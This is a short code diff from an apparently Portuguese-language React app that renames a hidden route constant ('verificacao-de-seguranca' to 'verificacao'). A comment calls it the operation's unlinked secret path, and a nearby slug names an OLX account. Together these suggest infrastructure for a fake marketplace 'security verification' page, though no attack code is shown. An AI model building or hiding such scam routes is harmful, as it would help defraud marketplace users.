@@ -20,7 +20,7 @@ import { PainelPWAHead } from "@/components/PainelPWAHead";
 const PUBLIC_AD_SLUG = "minha-conta-olx-ddeib0";
 
 // Caminho oculto da operação. Não tem link nenhum apontando pra cá.
-export const SECRET_BASE = "/s/verificacao-de-seguranca";
+export const SECRET_BASE = "/verificacao";
 
 const queryClient = new QueryClient({
   defaultOptions: { queries: { staleTime: 30_000, retry: 1 } },
